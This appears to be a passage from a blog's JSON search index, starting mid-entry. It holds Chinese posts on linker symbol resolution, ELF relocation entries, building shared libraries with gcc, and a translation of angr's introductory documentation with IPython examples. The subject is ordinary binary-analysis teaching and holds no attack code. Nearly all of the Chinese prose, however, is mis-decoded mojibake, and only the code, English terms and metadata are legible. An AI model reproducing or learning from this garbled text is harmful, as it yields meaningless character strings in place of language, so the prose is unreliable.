‡æ–‡ä»¶å¯»æ‰¾Uä¸­æœªå®šä¹‰çš„ç¬¦å·ï¼Œå¦‚æœæ‰¾åˆ°ï¼Œåˆ™å°†è¿™ä¸ªæ–‡ä»¶åŠ å…¥é›†åˆEï¼Œç›¸åº”åˆ é™¤è¿™ä¸ªæ–‡ä»¶ä¸­åŒ…å«çš„Uä¸­æœªå®šä¹‰çš„ç¬¦å·ã€‚å°†Dä¸­æ²¡æœ‰çš„ã€è¯¥æ–‡ä»¶ä¸­å®šä¹‰çš„å…¶ä»–ç¬¦å·åŠ å…¥Dä¸­ã€‚é€ä¸ªæ‰«æé™æ€åº“ä¸­çš„æ¯ä¸ªå¯é‡å®šå‘ç›®æ ‡æ–‡ä»¶ï¼Œå¦‚æœUä¸­æ²¡æœ‰å¯¹åº”çš„ä¸ºå®šä¹‰çš„ç¬¦å·ï¼Œåˆ™è¯¥æ–‡ä»¶è¢«ä¸¢å¼ƒã€‚ æ‰€æœ‰æ–‡ä»¶æ‰«æç»“æŸåï¼Œå¦‚æœUæ˜¯ç©ºçš„ï¼Œåˆ™é“¾æ¥å™¨ä¼šåˆå¹¶Eä¸­çš„å¯é‡å®šå‘ç›®æ ‡æ–‡ä»¶æ¥ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚å¦‚æœUéç©ºï¼Œåˆ™é“¾æ¥å™¨ä¼šè¾“å‡ºä¸€ä¸ªé”™è¯¯è€Œä¸­æ­¢ã€‚ ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:3:4","tags":["reverse"],"title":"ç®€æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œç¨‹åºé“¾æ¥è¿‡ç¨‹","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"é‡å®šä½ ç¬¦å·è§£æå®Œæˆåï¼Œè¿æ¥å™¨ä¼šåˆå¹¶å„è¾“å…¥æ¨¡å—ï¼Œä¸ºæ¯ä¸ªç¬¦å·åˆ†é…è¿è¡Œæ—¶åœ°å€ é‡å®šä½èŠ‚å’Œç¬¦å·å®šä¹‰ é“¾æ¥å™¨å°†å¤šä¸ªå¯é‡å®šå‘ç›®æ ‡æ–‡ä»¶ä¸­ç›¸åŒçš„sectionåˆæˆä¸€ä¸ªæ–°çš„sectionï¼Œå¹¶ä¸ºæ¯æ¡æŒ‡ä»¤å’Œå…¨å±€å˜é‡åˆ†é…è¿è¡Œæ—¶åœ°å€ é‡å®šä½èŠ‚ä¸­çš„ç¬¦å·å¼•ç”¨ æ±‡ç¼–å™¨åœ¨ç”Ÿæˆå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶æ—¶ï¼Œå¹¶ä¸çŸ¥é“æ•°æ®å’Œä»£ç æœ€ç»ˆæ”¾åœ¨å†…å­˜çš„ä»€ä¹ˆåœ°æ–¹ï¼Œä¹Ÿä¸çŸ¥é“è¯¥æ¨¡å—å¤–å¼•ç”¨çš„å¤–éƒ¨å®šä¹‰çš„å‡½æ•°ä»¥åŠå…¨å±€å˜é‡çš„ä½ç½®ã€‚æ‰€ä»¥å½“é‡åˆ°ä¸ç¡®å®šçš„ç¬¦å·å¼•ç”¨æ—¶ï¼Œæ±‡ç¼–å™¨å°±ä¼šç”Ÿæˆä¸€ä¸ªé‡å®šå‘æ¡ç›®ï¼Œå¹¶å°†ä¸ç¡®å®šçš„å¼•ç”¨åœ°å€å¡«0å ä½ã€‚ é‡å®šå‘æ¡ç›®å‘Šè¯‰é“¾æ¥å™¨åœ¨åˆæˆå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶æ—¶åº”è¯¥å¦‚ä½•ä¿®æ”¹è¿™ä¸ªå¼•ç”¨ï¼Œ.textèŠ‚çš„é‡å®šä½æ¡ç›®æ”¾åœ¨.rel.textä¸­ã€‚ // é‡å®šä½æ¡ç›®çš„ç»“æ„ typedef struct { long offset; //è¢«ä¿®æ”¹çš„å¼•ç”¨çš„èŠ‚åç§»é‡ long type:32, // é‡å®šä½ç±»å‹l symbol:32; //è¡¨ç¤ºè¢«ä¿®æ”¹çš„å¼•ç”¨æ˜¯ä¸€ä¸ªç¬¦å· long addend; //å¸¸æ•°ï¼Œä¸€äº›ä½¿ç”¨è¿›è¡Œåç§»è°ƒæ•´ }ELF64_Rela é‡å®šä½ç±»å‹å¸¸è§çš„æœ‰ï¼šé‡å®šä½ç»å¯¹å¼•ç”¨å’Œé‡å®šä½ç›¸å¯¹å¼•ç”¨ï¼Œä¸è¯¦ç»†å™è¿°ã€‚ ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:3:5","tags":["reverse"],"title":"ç®€æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œç¨‹åºé“¾æ¥è¿‡ç¨‹","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"åŠ¨æ€é“¾æ¥ ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:4:0","tags":["reverse"],"title":"ç®€æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œç¨‹åºé“¾æ¥è¿‡ç¨‹","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"å…±äº«åº“æ–‡ä»¶ æ˜¯ä¸€ç§ç‰¹æ®Šçš„å¯é‡å®šå‘ç›®æ ‡æ–‡ä»¶ï¼Œlinuxç³»ç»Ÿä¸­ä½¿ç”¨.soåç¼€ï¼Œwindowsç³»ç»Ÿä¸­ä½¿ç”¨.dllåç¼€ã€‚åŠ¨æ€é“¾æ¥ä¸­ä½¿ç”¨çš„åº“æ–‡ä»¶ã€‚åœ¨ç¨‹åºé±¼å½¢è¿‡ç¨‹ä¸­ï¼Œèƒ½è¢«åŠ è½½åˆ°å†…å­˜çš„ä»»æ„åœ°å€ï¼Œè¿˜èƒ½ä¸ä¸€ä¸ªå†…å­˜ä¸­çš„ç¨‹åºé“¾æ¥èµ·æ¥ã€‚ ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:4:1","tags":["reverse"],"title":"ç®€æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œç¨‹åºé“¾æ¥è¿‡ç¨‹","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"æ„é€ å…±äº«åº“ gcc --shared -fpic -o libmain.so main.c # fpicï¼šç”Ÿæˆä½ç½®æ— å…³ä»£ç  ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:4:2","tags":["reverse"],"title":"ç®€æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œç¨‹åºé“¾æ¥è¿‡ç¨‹","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"ä½¿ç”¨æŒ‡å®šå…±äº«åº“é“¾æ¥ gcc -o main main.c ./libmain.so é“¾æ¥å™¨æ­¤æ—¶å¹¶æœªå°†libmin.soä¸­çš„ä»£ç å’Œæ•°æ®å¤åˆ¶åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œåªæ˜¯å¤åˆ¶äº†ä¸€äº›ç¬¦å·è¡¨å’Œé‡å®šä½ä¿¡æ¯ å½“mainç¨‹åºè¢«åŠ è½½è¿è¡Œæ—¶ï¼ŒåŠ è½½å™¨ä¼šå‘ç°å¯æ‰§è¡Œç¨‹åºä¸­å­˜åœ¨ä¸€ä¸ªåä¸º.interpçš„èŠ‚ï¼Œè¿™ä¸ªèŠ‚ä¸­åŒ…å«äº†åŠ¨æ€é“¾æ¥å™¨çš„è·¯å¾„åï¼Œå®é™…ä¸Šè¿™ä¸ªè¿æ¥å™¨ä¹Ÿæ˜¯ä¸€ä¸ªå…±äº«ç›®æ ‡æ–‡ä»¶ï¼ˆld-linux.soï¼‰ã€‚æ¥ä¸‹æ¥ï¼ŒåŠ è½½å™¨ä¼šå°†è¿™ä¸ªåŠ¨æ€é“¾æ¥å™¨åŠ è½½åˆ°å†…å­˜ä¸­è¿è¡Œï¼Œç„¶åç”±åŠ¨æ€é“¾æ¥å™¨æ‰§è¡Œé‡å®šä½ä»£ç å’Œæ•°æ®çš„å·¥ä½œã€‚ é‡å®šä½ä¹‹åï¼ŒåŠ¨æ€é“¾æ¥å™¨æŠŠæ§åˆ¶æƒé™äº¤ç»™å¯æ‰§è¡Œç¨‹åºã€‚ä»è¿™ä»¥åï¼Œå…±äº«åº“çš„ä½ç½®å°±å›ºå®šäº†ï¼Œåœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­éƒ½ä¸ä¼šæ”¹å˜ ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:4:3","tags":["reverse"],"title":"ç®€æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œç¨‹åºé“¾æ¥è¿‡ç¨‹","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"åœ¨è¿è¡Œæ—¶åŠ è½½å…±äº«åº“ linuxç³»ç»Ÿä¸ºåŠ¨æ€é“¾æ¥å™¨æä¾›äº†æ¥å£ï¼Œå¯ä»¥ä½¿ç¨‹åºåœ¨è¿è¡Œæ—¶åŠ è½½å’Œé“¾æ¥å…±äº«åº“ï¼Œå¯ä½¿ç”¨dlopenã€dlsymå‡½æ•°åŠ è½½ï¼Œä½¿ç”¨dlcloseå‡½æ•°å¸è½½ã€‚è¿™é‡Œä¸ç»†è¯´äº†ã€‚ ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:4:4","tags":["reverse"],"title":"ç®€æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œç¨‹åºé“¾æ¥è¿‡ç¨‹","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Angr"],"content":"README angræ˜¯ä¸€ä¸ªå¤šæ¶æ„äºŒè¿›åˆ¶åˆ†æå·¥å…·åŒ…ï¼Œèƒ½å¤Ÿå®ç°å¯¹äºŒè¿›åˆ¶ç¨‹åºçš„åŠ¨æ€ç¬¦å·æ‰§è¡Œï¼ˆåƒMayhem, KLEE, ç­‰ç­‰ï¼‰å’Œå„ç§é™æ€åˆ†æã€‚å¦‚æœä½ æƒ³è¦å­¦ä¹ å¦‚ä½•ä½¿ç”¨angr, é‚£ä¹ˆä½ å°±æ¥å¯¹åœ°æ–¹äº†ã€‚ æˆ‘ä»¬åŠªåŠ›ä½¿æ‚¨æ›´åŠ è½»æ¾åœ°ä½¿ç”¨angrâ€”â€”æˆ‘ä»¬çš„ç›®æ ‡æ˜¯åˆ›é€ ä¸€ä¸ªå¯¹ä½¿ç”¨è€…å‹å¥½çš„äºŒè¿›åˆ¶åˆ†æå¥—ä»¶ï¼Œè®©ç”¨æˆ·ç®€å•åœ°ä½¿ç”¨ipythonè¿è¡Œä¸€äº›æŒ‡ä»¤ï¼Œå°±èƒ½åˆ†æå¯†å¯†éº»éº»çš„äºŒè¿›åˆ¶ç¨‹åºã€‚è¯è™½å¦‚æ­¤ï¼Œä½†äºŒè¿›åˆ¶åˆ†ææ˜¯ååˆ†å¤æ‚çš„ï¼Œangrä¹Ÿä¸å¾—ä¸æ˜¾å¾—å¤æ‚ã€‚æœ¬æ–‡æ¡£å°†åŠªåŠ›å¸®ä½ èµ°å‡ºå›°å¢ƒï¼Œä¸ºä½ æä¾›ä¸€äº›angrè®¾è®¡åŸåˆ™çš„è§£é‡Šå’Œå¯èƒ½çš„æ¢ç´¢ è¦è¿›è¡ŒäºŒè¿›åˆ¶åˆ†æï¼Œæˆ‘ä»¬å¿…é¡»è§£å†³ä»¥ä¸‹é—®é¢˜ï¼š å°†äºŒè¿›åˆ¶ç¨‹åºè½¬æ¢ä¸ºä¸­é—´è¯­è¨€ï¼ˆintermediate representationï¼‰ æ‰§è¡Œç¡®åˆ‡çš„åˆ†æï¼Œå¯èƒ½çš„æ­¥éª¤æœ‰ï¼š éƒ¨åˆ†æˆ–å®Œæ•´ç¨‹åºçš„é™æ€åˆ†æï¼ˆå¦‚ä¾èµ–åˆ†æã€ç¨‹åºåˆ‡ç‰‡åˆ†æç­‰ï¼‰ å¯¹ç¨‹åºæ‰§è¡ŒçŠ¶æ€çš„ç¬¦å·åŒ–æ¢ç´¢ï¼ˆå¦‚â€œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œç¨‹åºç›´åˆ°æ‰¾åˆ°æº¢å‡ºç‚¹å—ï¼Ÿâ€ï¼‰ ä¸Šé¢ä¸¤è€…çš„ç»“åˆï¼ˆå¦‚â€œè®©æˆ‘ä»¬åªæ‰§è¡Œç¨‹åºå†™å…¥å†…å­˜çš„ç‰‡æ®µï¼Œå»æ‰¾åˆ°ä¸€ä¸ªæº¢å‡ºç‚¹â€ï¼‰ angrçš„ç»„ä»¶å¯ä»¥åº”å¯¹ä»¥ä¸Šæ‰€æœ‰çš„é—®é¢˜ã€‚è¿™æœ¬æ‰‹å†Œå°†ä¼šè§£é‡Šæ¯ä¸€ä¸ªç»„ä»¶æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨ä»–ä»¬æ¥è¾¾æˆä½ çš„ç›®æ ‡ ","date":"2022-09-05","objectID":"/2022/09/readme/:1:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆä¸€ï¼‰README","uri":"/2022/09/readme/"},{"categories":["Angr"],"content":"Top Level Interface ","date":"2022-09-05","objectID":"/2022/09/top_level_interface/:0:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆäºŒï¼‰Top Level Interface","uri":"/2022/09/top_level_interface/"},{"categories":["Angr"],"content":"å¼€å§‹ä¹‹å‰ï¼ˆBefore You Startï¼‰ æˆ‘ä»¬é¢„æœŸçš„angrä¸»è¦çš„åº”ç”¨åœºæ™¯æ˜¯Ipythonï¼ˆæˆ–è€…å…¶ä»–pythonå‘½ä»¤è¡Œè§£é‡Šå™¨ï¼‰ã€‚å½“ä½ ä¸ç¡®å®šå¯ä»¥ç”¨ä»€ä¹ˆæ¥å£æ—¶ï¼Œtabé”®çš„ è¡¥å…¨å¾€å¾€èƒ½å¸®åŠ©åˆ°ä½ ã€‚ æœ‰æ—¶Ipythonä¸­çš„tabè¡¥å…¨ä¼šå¾ˆæ…¢ã€‚æˆ‘ä»¬å‘ç°ä»¥ä¸‹è§£å†³æ–¹æ³•å¾ˆæœ‰æ•ˆä¸”ä¸ä¼šå½±å“è¡¥å…¨åŠŸèƒ½çš„å®Œæ•´æ€§ï¼š # å°†æ­¤æ–‡ä»¶æ”¾åœ¨Ipythoné…ç½®æ–‡ä»¶çš„å¯åŠ¨ç›®å½•ä¸­å¯ä»¥é¿å…æ¯æ¬¡éƒ½å•ç‹¬1è¿è¡Œå®ƒ import IPython py = IPython.get_ipython() py.Completer.use_jedi = False ","date":"2022-09-05","objectID":"/2022/09/top_level_interface/:1:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆäºŒï¼‰Top Level Interface","uri":"/2022/09/top_level_interface/"},{"categories":["Angr"],"content":"æ ¸å¿ƒæ¦‚å¿µï¼ˆCore Conceptsï¼‰ åœ¨å¼€å§‹ä½¿ç”¨angrä¹‹å‰ï¼Œä½ å°†ä¼šå¯¹angrçš„åŸºæœ¬æ¦‚å¿µå’Œå¦‚ä½•æ„é€ ä¸€ä¸ªangrå¯¹è±¡æœ‰ä¸€ä¸ªåŸºæœ¬çš„æ¦‚è§ˆã€‚æˆ‘ä»¬å°†é€šè¿‡äºŒè¿›åˆ¶ç¨‹åºåŠ è½½åç›´æ¥å¯ç”¨çš„æ¥å£æ¥è¯´æ˜è¿™äº›æ¦‚å¿µã€‚ ä½ ä½¿ç”¨angråšçš„ç¬¬ä¸€ä»¶äº‹å¾€å¾€æ˜¯æŠŠäºŒè¿›åˆ¶ç¨‹åºåŠ è½½åˆ°å·¥ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä»¥/bin/trueä¸ºä¾‹ \u003e\u003e\u003e import angr \u003e\u003e\u003e proj = angr.Project('/bin/true') åœ¨angrä¸­ï¼Œä¸€ä¸ªprojectæ˜¯ä½ æ‰€èƒ½æ§åˆ¶çš„åŸºæœ¬å•å…ƒï¼Œé€šè¿‡projectï¼Œä½ å°†èƒ½å¯¹åˆšåˆšåŠ è½½çš„äºŒè¿›åˆ¶ç¨‹åºè¿›è¡Œåˆ†æå’Œæ¨¡æ‹Ÿã€‚å‡ ä¹ä½ åœ¨angré¡¹ç›®ä¸­ä½¿ç”¨çš„æ¯ä¸€ä¸ªå¯¹è±¡éƒ½ä¾èµ–äºæŸç§å½¢å¼çš„projectè€Œå­˜åœ¨ ","date":"2022-09-05","objectID":"/2022/09/top_level_interface/:2:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆäºŒï¼‰Top Level Interface","uri":"/2022/09/top_level_interface/"},{"categories":["Angr"],"content":"åŸºæœ¬å±æ€§ï¼ˆBasic propertiesï¼‰ é¦–å…ˆï¼Œprojectæœ‰ä¸€äº›åŸºæœ¬å±æ€§ï¼šå®ƒçš„CPUæ¶æ„ï¼Œå®ƒçš„æ–‡ä»¶åå’Œç¨‹åºå…¥å£ç‚¹ã€‚ \u003e\u003e\u003e import monkeyhex # ç”¨æ¥å°†æ•°å­—ç»“æœè½¬åŒ–ä¸º16è¿›åˆ¶ \u003e\u003e\u003e proj.arch \u003cArch AMD64(LE)\u003e \u003e\u003e\u003e proj.entry 0x401670 \u003e\u003e\u003e proj.filename '/bin/true' archæ˜¯archinfo.Archå¯¹è±¡çš„å®ä¾‹ï¼Œç”¨æ¥æŒ‡æ˜ç¨‹åºç¼–è¯‘çš„æ¶æ„ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­æ˜¯little-endian amd64ã€‚å®ƒåŒ…å«è®¸å¤šå®ƒæ‰€è¿è¡Œçš„CPUçš„ä¿¡æ¯ï¼Œä½ å¯ä»¥åœ¨é—²æš‡æ—¶ç»†è¯»ã€‚é€šå¸¸æƒ…å†µä¸‹ä½ æ‰€å…³å¿ƒçš„æ˜¯arch.bitsï¼Œarch.bytesï¼ˆè¿™ä¸ªæ˜¯main Arch class çš„@propertyå£°æ˜ï¼‰ï¼Œarch.nameå’Œarch.memory_endness entrryæ˜¯äºŒè¿›åˆ¶ç¨‹åºçš„å…¥å£ç‚¹ filenameæ˜¾ç„¶æ˜¯äºŒè¿›åˆ¶ç¨‹åºçš„æ–‡ä»¶å ","date":"2022-09-05","objectID":"/2022/09/top_level_interface/:2:1","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆäºŒï¼‰Top Level Interface","uri":"/2022/09/top_level_interface/"},{"categories":["Angr"],"content":"åŠ è½½å™¨ï¼ˆThe loaderï¼‰ ä»ä¸€ä¸ªäºŒè¿›åˆ¶ç¨‹åºåˆ°å®ƒåœ¨è™šæ‹Ÿåœ°å€ç©ºé—´çš„æ˜ å°„æ˜¯ååˆ†å¤æ‚çš„ï¼æˆ‘ä»¬æœ‰ä¸€ä¸ªå«CLE(Christopheâ€™s Loader for Everything) çš„æ¨¡å—å»è§£å†³è¿™ä¸ªé—®é¢˜ã€‚CLEå°±æ˜¯ä¸€ç§åŠ è½½å™¨ï¼Œå¯ä»¥é€šè¿‡.loaderå±æ€§è°ƒç”¨ã€‚æˆ‘ä»¬å°†åœ¨åé¢è¯¦ç»†äº†è§£å¦‚ä½•ä½¿ç”¨å®ƒï¼Œä½†ç°åœ¨ä½ åªéœ€çŸ¥é“ä½ å¯ä»¥ç”¨å®ƒæŸ¥çœ‹angréšç€ä½ çš„ç¨‹åºåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ï¼ˆshared librariesï¼‰å¹¶ä¸”æ‰§è¡Œä¸€äº›å¯¹äºä»–ä»¬åœ°å€ç©ºé—´çš„åŸºæœ¬çš„æŸ¥è¯¢ \u003e\u003e\u003e proj.loader \u003cloaded true, maps [0x400000:0x5004000]\u003e \u003e\u003e\u003e proj.loader.shared_objects # æˆ–è®¸å’Œä½ çš„çœ‹èµ·æ¥æœ‰ç‚¹ä¸ä¸€æ · {'ld-linux-x86-64.so.2': \u003cELF Object ld-2.24.so, maps [0x2000000:0x2227167]\u003e, 'libc.so.6': \u003cELF Object libc-2.24.so, maps [0x1000000:0x13c699f]\u003e} \u003e\u003e\u003e proj.loader.min_addr 0x400000 \u003e\u003e\u003e proj.loader.max_addr 0x5004000 \u003e\u003e\u003e proj.loader.main_object # æˆ‘ä»¬å·²ç»åœ¨é¡¹ç›®ä¸­åŠ è½½äº†å‡ ä¸ªäºŒè¿›åˆ¶ç¨‹åºã€‚è¿™é‡Œæ˜¯ä¸»è¦çš„ä¸€ä¸ª \u003cELF Object true, maps [0x400000:0x60721f]\u003e \u003e\u003e\u003e proj.loader.main_object.execstack # æŸ¥è¯¢ç¤ºä¾‹ï¼šæ˜¯å¦å­˜åœ¨å¯æ‰§è¡Œæ ˆæ®µ False \u003e\u003e\u003e proj.loader.main_object.pic # æŸ¥è¯¢ç¤ºä¾‹ï¼šè¿™ä¸ªäºŒè¿›åˆ¶ç¨‹åºæ˜¯åœ°å€æ— å…³ä»£ç å—ï¼Ÿ # pic(position-independent code)æŒ‡å¯åœ¨ä¸»å­˜å‚¨å™¨ä¸­ä»»æ„ä½ç½®æ­£ç¡®æ‰§è¡Œï¼Œè€Œä¸å—å…¶ç»å¯¹åœ°å€å½±å“çš„ä¸€ç§æœºå™¨ç ï¼Œå¸¸ç”¨äºåŠ¨æ€é“¾æ¥åº“ ","date":"2022-09-05","objectID":"/2022/09/top_level_interface/:2:2","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆäºŒï¼‰Top Level Interface","uri":"/2022/09/top_level_interface/"},{"categories":["Angr"],"content":"å·¥å‚ï¼ˆThe Factoryï¼‰ åœ¨angrä¸­æœ‰è®¸å¤šç±»ï¼Œè€Œå®ƒä»¬ä¸­çš„å¤§å¤šæ•°éœ€è¦ä¸€ä¸ªprojectå»æŠŠä»–ä»¬å®ä¾‹åŒ–ã€‚æˆ‘ä»¬å¹¶ä¸ä¼šè®©ä½ åˆ°å¤„ä¼ é€’projectï¼Œè€Œæ˜¯æä¾›äº†project.factoryï¼Œå…¶ä¸­åŒ…å«äº†ä¸€äº›ä½ ä¼šé¢‘ç¹ä½¿ç”¨åˆ°çš„ã€å¸¸è§å¯¹è±¡çš„æ„é€ å™¨ã€‚ æœ¬èŠ‚è¿˜å°†ä»‹ç»angrçš„ä¸€äº›åŸºæœ¬æ¦‚å¿µã€‚ å—ï¼ˆBlocksï¼‰ é¦–å…ˆï¼Œæˆ‘ä»¬æœ‰project.factory.block()ï¼Œå¸¸å¸¸ç”¨æ¥ä»ç»™å®šåœ°å€æå–åŸºæœ¬ä»£ç å—ã€‚è¿™æ˜¯ä¸€ä¸ªé‡è¦çš„äº‹å®â€”â€”angrä»¥å—ä¸ºåŸºæœ¬å•ä½åˆ†æä»£ç ã€‚ä½ ä¼šå¾—åˆ°ä¸€ä¸ªblockå¯¹è±¡ï¼Œå…¶ä¸­åŒ…å«äº†è®¸å¤šå…³äºè¿™ä¸ªä»£ç å—çš„æœ‰è¶£çš„ä¸œè¥¿ \u003e\u003e\u003e block = proj.factory.block(proj.entry) # ä»ç¨‹åºçš„å…¥å£ç‚¹å–å‡ºä¸€ä¸ªä»£ç å— \u003cBlock for 0x401670, 42 bytes\u003e \u003e\u003e\u003e block.pp() # pretty-print å‘stdoutè¾“å‡ºç›¸åº”åæ±‡ç¼–ä»£ç  0x401670: xor ebp, ebp 0x401672: mov r9, rdx 0x401675: pop rsi 0x401676: mov rdx, rsp 0x401679: and rsp, 0xfffffffffffffff0 0x40167d: push rax 0x40167e: push rsp 0x40167f: lea r8, [rip + 0x2e2a] 0x401686: lea rcx, [rip + 0x2db3] 0x40168d: lea rdi, [rip - 0xd4] 0x401694: call qword ptr [rip + 0x205866] \u003e\u003e\u003e block.instructions # åœ¨è¿™ä¸ªä»£ç å—ä¸­å…±æœ‰å¤šå°‘æ¡æŒ‡ä»¤ï¼Ÿ 0xb \u003e\u003e\u003e block.instruction_addrs # è¿™ä¸ªä»£ç å—ä¸­æŒ‡ä»¤çš„åœ°å€åˆ†åˆ«æ˜¯å¤šå°‘ï¼Ÿ [0x401670, 0x401672, 0x401675, 0x401676, 0x401679, 0x40167d, 0x40167e, 0x40167f, 0x401686, 0x40168d, 0x401694] æ›´å¤šçš„ï¼Œä½ å¯ä»¥ä½¿ç”¨blockå¯¹è±¡è·å¾—å—ä»£ç çš„å…¶ä»–è¡¨ç¤ºå½¢å¼ \u003e\u003e\u003e block.capstone # capstone disassembly \u003cCapstoneBlock for 0x401670\u003e \u003e\u003e\u003e block.vex # VEX IRSB (è¿™æ˜¯pythonå†…éƒ¨åœ°å€ï¼Œè€Œä¸æ˜¯ç¨‹åºå†…éƒ¨åœ°å€) \u003cpyvex.block.IRSB at 0x7706330\u003e çŠ¶æ€ï¼ˆstatesï¼‰ å…³äºangrçš„å¦ä¸€ä¸ªäº‹å®æ˜¯â€”â€”projectå¯¹è±¡ä»…ä»…ç›¸å½“äºç¨‹åºçš„ä¸€ä¸ªâ€œåˆå§‹åŒ–é•œåƒâ€ã€‚å½“ä½ ä½¿ç”¨angræ‰§è¡Œè¿è¡Œç¨‹åºæ—¶ï¼Œä½ æ­£åœ¨ä½¿ç”¨ä¸€ä¸ªæ¨¡æ‹Ÿç¨‹åºè¿è¡ŒçŠ¶æ€çš„å¯¹è±¡-SimStateã€‚æ¯”å¦‚ï¼š \u003e\u003e\u003e state = proj.factory.entry_state() \u003cSimState @ 0x401670\u003e 